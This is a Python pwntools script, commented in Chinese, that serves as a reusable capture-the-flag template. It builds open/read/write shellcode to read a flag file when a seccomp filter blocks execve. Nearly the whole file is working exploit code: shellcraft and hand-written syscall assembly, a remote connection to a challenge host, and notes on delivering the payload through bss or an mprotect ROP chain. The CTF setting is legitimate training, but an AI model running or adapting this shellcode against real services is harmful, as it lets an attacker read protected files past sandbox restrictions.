#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: ORW 模板 —— seccomp 只放行 open/read/write 时, 用纯汇编 shellcode 读 /flag 并回显
适用条件:
    - seccomp 禁了 execve(先 seccomp-tools dump ./pwn 确认白名单)
    - 有可执行内存: mprotect 改 RWX / bss 本身 X / NOP 滑板进栈执行
    - 若 sendfile 也在白名单, 可用注释里的 shellcraft.cat 一步带出(更快)
用法:
    1) 改 CONFIG 区: HOST/PORT/FLAG 路径/ARCH
    2) 改 shellcode 投放点: 程序哪里能输入、从哪开始执行(注释中标了常见三种)
"""
from pwn import *

# ==================== CONFIG: TODO 改这里 ====================
BINARY = "./pwn"            # TODO: 改这里
HOST, PORT = "node.node3.com", 23333  # TODO: 改这里: 远程地址
FLAG_PATH = "/flag"         # TODO: 改这里: flag 路径, 常见还有 /flag.txt ./flag
ARCH = 64                   # TODO: 改这里: 64 / 32
# =============================================================

context.log_level = "info"
context.arch = "amd64" if ARCH == 64 else "i386"


def build_orw(path):
    """open(path) -> read(fd 到栈) -> write(1, 栈): 三段拼接, fd 由 rax/eax 传递"""
    if ARCH == 64:
        sc = shellcraft.open(path)                       # open 返回值在 rax
        sc += shellcraft.read("rax", "rsp", 0x100)       # fd=rax, 读到栈顶缓冲
        sc += shellcraft.write(1, "rsp", 0x100)          # 输出到 stdout
        # 备选: shellcraft.cat(path) 走 sendfile, 一条龙读出, 仅当 sendfile 被放行
    else:
        sc = shellcraft.i386.open(path)
        sc += shellcraft.i386.read("eax", "esp", 0x100)
        sc += shellcraft.i386.write(1, "esp", 0x100)
    return asm(sc)


def build_orw_raw(path):
    """手写 syscall 版(不依赖 shellcraft, 想精细控制时用), 64 位示例"""
    # open: rax=2, rdi=path, rsi=0 ; read: rax=0, rdi=fd, rsi=buf, rdx=len
    # write: rax=1, rdi=1, rsi=buf, rdx=len
    return asm(f"""
        /* open("{path}", 0) */
        lea rdi, [rip+path]
        xor esi, esi
        mov eax, 2
        syscall
        /* read(fd, rsp, 0x100) */
        mov edi, eax
        mov rsi, rsp
        mov edx, 0x100
        xor eax, eax
        syscall
        /* write(1, rsp, 0x100) */
        mov edi, 1
        mov rsi, rsp
        mov edx, 0x100
        mov eax, 1
        syscall
        /* 死循环防止退出, 便于观察输出 */
        jmp $
        path:
        .string "{path}"
    """)


def start():
    # TODO: 改这里: 本地调试换成 process(BINARY)
    return remote(HOST, PORT)


def pwn():
    io = start()
    shellcode = build_orw(FLAG_PATH)
    log.info(f"shellcode len = {len(shellcode)}")

    # ---- shellcode 投放点(三选一, 按题目改) ----
    # 1) 程序直接把输入当函数指针/返回地址执行: 直接发过去
    io.sendlineafter(b">", shellcode)        # TODO: 改这里: 提示符按题目改
    # 2) 输入到 bss 再 ret: 先发 shellcode, 再发ROP: p64(bss_addr)
    # 3) 栈不可执行: 先 mprotect(栈页, len, 7) 的 ROP, 再把 shellcode 垫在返回地址后面执行

    io.interactive()  # flag 直接打在回显里


if __name__ == "__main__":
    pwn()
